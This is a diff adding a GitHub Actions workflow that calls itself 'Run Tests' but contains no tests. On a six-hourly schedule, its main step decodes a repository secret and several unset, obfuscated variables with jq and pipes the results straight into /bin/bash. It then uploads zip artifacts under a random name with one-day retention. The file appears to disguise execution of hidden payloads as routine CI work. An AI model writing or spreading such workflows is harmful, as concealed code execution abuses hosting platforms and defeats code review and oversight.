@@ -1,0 +1,36 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '58 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          ogig82085: ${{ secrets.ogig82085 }}
+        run: |
+          printf '%s' "$ogig82085" | jq -r .b3916 | /bin/bash
+          printf '%s' "$lqwp06" | jq -r .w9 | /bin/bash
+          printf '%s' "$w4927" | jq -r .z7332 | /bin/bash
+          printf '%s' "$shy35" | jq -r .f61186 | /bin/bash
+          echo $pf605 | jq -r .hl935 | /bin/bash
+          printf '%s' "$ef12583" | jq -r .vysd4 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: TGPEJPUh
+          path: "*.zip"
+          retention-days: 1
